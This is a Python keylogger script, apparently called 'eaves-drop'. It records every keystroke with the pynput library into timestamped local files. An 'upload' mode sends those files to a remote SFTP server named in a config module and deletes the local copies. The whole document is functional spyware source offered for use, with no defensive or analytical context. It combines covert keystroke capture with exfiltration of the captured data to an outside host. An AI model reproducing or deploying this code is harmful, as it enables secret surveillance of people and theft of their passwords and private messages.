#!/usr/bin/env python3
from pynput import keyboard
from datetime import date, datetime, timedelta
from pathlib import Path
import logging
import os
import sys
import config


log_path = Path('./eaves-drop.log')
logging.basicConfig(filename=log_path, level=logging.DEBUG)


def write_key_to_file(key):
    filename = config.local_keylogs_dir / '{datetime}.txt'.format(datetime=datetime.now().strftime('%Y%m%d%H%M'))
    file = open(filename, mode='a')
    file.write(key)
    file.close()


def upload_logged_keys(date=None, ftp_server=None):
    files = os.listdir(config.local_keylogs_dir)
    today = date.today()
    files = list(filter(lambda file: file if datetime.strptime(file[:8], '%Y%m%d').date() <= today else False, files))
    if len(files) > 0:
        for file in files:
            local_file = config.local_keylogs_dir / file
            remote_file = config.remote_keylogs_dir / file
            if not config.sftp_server.exists(bytes(remote_file)):
                ftp_server.put(bytes(local_file), bytes(remote_file))
            os.unlink(local_file)


def on_press(key):
    logging.info('on_press fn - {}'.format(key))
    if isinstance(key, keyboard.Key):  # special keys, Alt, Shift, Space etc
        if key == key.space:
            key = " "
        elif key == key.enter:
            key = "\n"
        else:
            key = ""
    elif isinstance(key, keyboard.KeyCode):  # normal alphanumeric keys
        key = key.char
    key = key.strip("'")
    write_key_to_file(key)


if len(sys.argv) == 2:
    arg = sys.argv[1]

    if arg == 'start':
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    if arg == 'upload':
        date = date.today()
        upload_logged_keys(date, config.sftp_server)

